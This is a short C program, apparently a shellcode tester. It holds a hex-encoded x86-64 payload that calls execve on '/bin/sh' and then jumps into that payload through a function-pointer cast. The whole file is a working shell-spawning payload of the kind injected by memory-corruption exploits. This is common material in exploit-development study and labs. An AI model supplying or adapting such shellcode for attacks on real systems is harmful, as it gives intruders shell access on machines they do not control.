#include<unistd.h>
#define BUFLEN 1024

typedef void(*func_t)(void);

char shellcode[] = 
"\x48\x31\xc0\xb0\x3b\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73"
"\x68\x00\x5f\x48\x31\xf6\x48\x31\xd2\x0f\x05";

int main(){
  func_t f = (func_t)shellcode;
  f();

  return 0;
}


